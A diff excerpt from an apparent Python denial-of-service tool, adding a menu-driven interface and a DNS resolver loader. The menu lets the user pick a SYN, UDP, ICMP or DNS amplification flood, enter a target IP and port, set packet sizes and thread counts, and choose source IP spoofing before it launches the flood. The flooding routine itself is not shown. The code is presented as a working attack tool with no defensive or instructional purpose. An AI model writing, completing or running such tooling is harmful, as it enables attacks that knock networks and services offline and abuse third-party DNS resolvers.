@@ -202,4 +202,88 @@ def load_dns_resolvers(filename="dns_resolvers.txt"):
             for line in f:
                 ip = line.strip()
                 if ip:
-                   
+                    resolvers.append(ip)
+    except FileNotFoundError:
+        print(f"{YELLOW}Warning: DNS resolvers file '{filename}' not found. DNS Amplification attack will not work.{RESET}")
+    return resolvers
+
+
+def main_menu():
+    while True:
+        clear_screen()
+        print(logo)
+        print(f"{RED}Main Menu{RESET}")
+        print("1) SYN Flood (TCP)")
+        print("2) UDP Flood")
+        print("3) ICMP Flood (Ping)")
+        print("4) DNS Amplification Flood")
+        print("5) Exit")
+        choice = input(f"{GREEN}Select an option (1-5): {RESET}")
+
+        if choice == '1':
+            attack_type = 'SYN'
+        elif choice == '2':
+            attack_type = 'UDP'
+        elif choice == '3':
+            attack_type = 'ICMP'
+        elif choice == '4':
+            attack_type = 'DNS_AMP'
+        elif choice == '5':
+            print("Exiting...")
+            sys.exit(0)
+        else:
+            print(f"{YELLOW}Invalid option. Please choose 1-5.{RESET}")
+            time.sleep(1)
+            continue
+
+        target_ip = input(f"{GREEN}Enter the target IP address: {RESET}").strip()
+        target_port = 0
+        if attack_type != 'DNS_AMP':
+            while True:
+                port_str = input(f"{GREEN}Enter the target port number (1-65535): {RESET}")
+                if port_str.isdigit() and 1 <= int(port_str) <= 65535:
+                    target_port = int(port_str)
+                    break
+                else:
+                    print(f"{YELLOW}Please enter a valid port number (1-65535).{RESET}")
+
+        min_packet_size = 64
+        max_packet_size = 64
+        if attack_type != 'DNS_AMP':
+            while True:
+                try:
+                    min_packet_size = int(input(f"{GREEN}Enter minimum packet size in bytes (64-1500): {RESET}"))
+                    max_packet_size = int(input(f"{GREEN}Enter maximum packet size in bytes (64-1500): {RESET}"))
+                    if 64 <= min_packet_size <= max_packet_size <= 1500:
+                        break
+                    else:
+                        print(f"{YELLOW}Packet sizes must be between 64 and 1500, and min <= max.{RESET}")
+                except ValueError:
+                    print(f"{YELLOW}Please enter valid integers for packet sizes.{RESET}")
+
+        spoof_ip_choice = 'n'
+        if attack_type != 'DNS_AMP':
+            spoof_ip_choice = input(f"{GREEN}Spoof source IP? (y/n): {RESET}").lower()
+            if spoof_ip_choice not in ['y', 'n']:
+                spoof_ip_choice = 'n'
+
+        num_threads = 10
+        while True:
+            try:
+                num_threads = int(input(f"{GREEN}Enter number of threads (1-100): {RESET}"))
+                if 1 <= num_threads <= 100:
+                    break
+                else:
+                    print(f"{YELLOW}Please enter a number between 1 and 100.{RESET}")
+            except ValueError:
+                print(f"{YELLOW}Please enter a valid integer.{RESET}")
+
+        dns_resolvers = None
+        if attack_type == 'DNS_AMP':
+            dns_resolvers = load_dns_resolvers()
+
+        start_flood(target_ip, target_port, min_packet_size, max_packet_size, spoof_ip_choice, attack_type, num_threads, dns_resolvers)
+
+
+if __name__ == "__main__":
+    main_menu()
